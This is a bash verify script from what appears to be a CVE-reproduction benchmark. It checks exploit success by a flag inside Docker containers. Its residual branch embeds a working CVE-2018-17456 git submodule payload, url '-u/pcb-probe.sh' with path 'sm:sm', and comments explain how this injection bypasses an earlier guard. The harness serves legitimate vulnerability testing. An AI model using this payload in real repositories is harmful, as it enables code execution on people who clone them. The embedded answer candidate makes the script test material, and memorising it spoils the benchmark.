#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual（CVE-2018-17456，_heldout/bypass_poc.py 语义内嵌，不引用 hidden 文件）：
  # url 值以 '-' 开头注入子 git clone。seed（ssh host 以 '-' 开头）在 V1(2.14.1) 被
  # CVE-2017-1000117 的 connect.c 守卫（"strange hostname blocked"）阻断；但该修复
  # 未防递归子进程 `git clone <url> <path>` 的 argv —— url="-u/pcb-probe.sh"
  # （== --upload-pack=/pcb-probe.sh）且 submodule path 含 ':'（sm:sm）走 upload-pack
  # 传输 -> 执行 canary /pcb-probe.sh -> /out/hit 写 "PCB_HIT <flag>"（V2 2.19.1 在
  # submodule--helper.c 插入 "--" 分隔才阻断）。
  # flag 通道 = injection 类：canary 由 victim.sh 在每次 probe 内以容器 env PCB_FLAG
  # （平台注入 =RUN_FLAG）种入 -> 判定基准 = RUN_FLAG_REF（真 flag；wrong/stale 时
  # canary 只有提交值、无法伪造真 flag）。
  # 说明：poc/seed_exec.py 模板生成错误（HERE/GIT_VER 未定义 + 只传 PCB_X 不传
  # PCB_FLAG），无法使用；本分支直接 docker run pcb-git:<VERSION> 执行公开 victim.sh。
  IMG="pcb-git:${VERSION}"
  if ! docker image inspect "$IMG" >/dev/null 2>&1; then
    echo "verify: 缺少镜像 $IMG（先 start.sh 构建）" >&2; exit 20; fi
  # residual candidate（内嵌字面量，写入 cand.json 留档）
  printf '%s' '{"probe_id": "cve-2018-17456-url-value-dash", "url": "-u/pcb-probe.sh", "path": "sm:sm"}' > "$WORK_DIR/cand.json"
  OUT="$(docker run --rm -e PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}" \
    -v "$CASE_DIR/victim.sh:/victim.sh:ro" \
    "$IMG" sh /victim.sh "-u/pcb-probe.sh" "sm:sm" 2>&1)" || true
  echo "${OUT:0:500}"
  if grep -qF "PCB_HIT ${RUN_FLAG_REF}" <<<"$OUT"; then exit 0; else exit 10; fi
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
if grep -q "$JUDGE_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
